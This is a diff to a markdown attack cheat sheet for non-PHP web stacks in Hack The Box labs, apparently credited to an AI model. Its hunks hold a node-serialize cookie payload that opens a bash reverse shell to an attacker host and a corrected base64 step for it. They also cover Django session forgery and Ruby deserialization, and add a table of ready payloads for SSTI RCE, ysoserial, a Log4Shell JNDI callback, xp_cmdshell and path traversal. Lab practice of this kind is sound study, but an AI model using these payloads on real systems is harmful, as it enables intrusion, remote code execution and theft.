@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Attack reference for non-PHP stacks commonly encountered in HTB boxes and labs. PHP has wrappers and log poisoning for easy LFI→RCE — other stacks require different chains. Key techniques: SSTI, insecure deserialization, framework-specific misconfigs.
+Attack reference for non-PHP stacks commonly encountered in HTB boxes and labs. PHP has wrappers and log poisoning for easy LFI→RCE — other stacks require different chains. Key techniques: SSTI, insecure deserialization, framework-specific misconfigs. Pairs with [[File Inclusion]], [[Deserialization]], [[Server-Side Attacks]], [[SQL Injection]].
 
 ---
 
@@ -372,8 +372,11 @@ echo "<cookie>" | base64 -d    # look for _$$ND_FUNC$$_
 # Payload structure:
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"')}()"}
 
-# Base64 encode and send as cookie
-echo '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}' | base64 -w 0
+# Base64 encode — use a quoted heredoc so $$ and single quotes stay literal
+# (the naive echo '...\'...' form is broken: \' can't escape a quote inside '...' in bash):
+base64 -w0 <<'EOF'
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+EOF
 ```
 
 ---
@@ -512,6 +515,10 @@ data = {'_auth_user_id': '1', '_auth_user_backend': 'django.contrib.auth.backend
 print(signing.dumps(data, key='<SECRET_KEY>', salt='django.contrib.sessions.backends.signed_cookies'))
 "
 # Set the output as sessionid cookie
+# NOTE: modern Django validates _auth_user_hash via get_session_auth_hash()
+# (HMAC-SHA256 of the user's password field, keyed by SECRET_KEY). An empty hash
+# only works on old/misconfigured apps — otherwise you must know the password hash
+# to compute it, or target an app that doesn't enforce SESSION_ verification.
 ```
 
 ---
@@ -654,17 +661,16 @@ curl http://target.com/ScriptResource.axd?d=...  # May reveal .NET version
 
 ```bash
 # Detection: binary blob in cookie (Rails < 4 used Marshal by default)
-# Generate payload with universal-deserialisation-gadget or ysoserial-ruby
-
-# Check cookie - if not a JWT and not JSON, may be Marshal
+# Check cookie - if not a JWT and not JSON, may be Marshal (magic bytes \x04\x08)
 echo "<cookie>" | base64 -d | file -
+echo "<cookie>" | base64 -d | xxd | head -1     # look for 0408 at the start
 
-# Ruby Marshal RCE PoC (simplified)
-ruby -e "
-require 'base64'
-payload = Marshal.dump(Gem::SpecFetcher.new)  # gadget chain varies
-puts Base64.encode64(payload)
-"
+# RCE requires a real gadget chain — a bare Marshal.dump of some object does NOT
+# execute on load. Use elttam's published universal Ruby deserialization gadget
+# (Luke Jahnke; works on stock Ruby 2.x–3.x, no extra gems) and paste its output:
+#   ruby universal_gadget.rb 'id'   →  base64 → set as the cookie
+# For modern Rails, prefer forging the signed cookie if you leak secret_key_base
+# (ActiveSupport::MessageEncryptor / a rails cookie decoder) — see [[Deserialization]].
 ```
 
 ### Mass Assignment
@@ -822,6 +828,32 @@ Identify stack (whatweb, headers, cookies, error pages)
 
 ---
 
+## Quick Reference
+
+| Goal | Payload / Command |
+|---|---|
+| Fingerprint stack | `curl -sI http://target.com \| grep -iE "server\|x-powered-by\|x-aspnet"` |
+| Spring Actuator dump | `curl http://target.com/actuator/env` |
+| Thymeleaf SSTI RCE | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::__` |
+| Java deserialization | `java -jar ysoserial.jar CommonsCollections6 'id' \| base64 -w 0` |
+| Log4Shell probe | `curl http://target.com/ -H 'User-Agent: ${jndi:ldap://<AttackerIP>:1389/a}'` |
+| Node Pug/EJS SSTI RCE | `<%= require('child_process').execSync('id').toString() %>` |
+| Node prototype pollution probe | `{"__proto__":{"admin":true}}` |
+| Jinja2 SSTI RCE (universal) | `{{''.__class__.__mro__[1].__subclasses__()[<INDEX>](['id'],stdout=-1).communicate()}}` |
+| Werkzeug debug PIN chain | LFI `/etc/machine-id` + `/proc/self/cgroup` → `werkzeug_pin.py` → `/__debugger__` |
+| Python pickle RCE | `pickle.dumps(Exploit())` where `__reduce__` returns `(os.system, (cmd,))` |
+| YAML deserialization RCE | `!!python/object/apply:os.system ["id"]` |
+| Django session forgery | `signing.dumps(data, key='<SECRET_KEY>', salt='django.contrib.sessions.backends.signed_cookies')` |
+| ViewState RCE (leaked machineKey) | `ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionkey=... --validationkey=... -c "..."` |
+| MSSQL → xp_cmdshell | `'; EXEC xp_cmdshell 'whoami'; --` |
+| Padding oracle | `padbuster http://target.com/ "<encrypted_cookie>" 8 -cookies "auth=<cookie>"` |
+| Rails ERB SSTI RCE | `<%= system("id") %>` |
+| Rails mass assignment | `{"user":{"username":"attacker","password":"pass","admin":true}}` |
+| XPath auth bypass | `Username: ' or '1'='1` |
+| Go path traversal | `curl 'http://target.com/static/../../../../etc/passwd'` |
+
+---
+
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
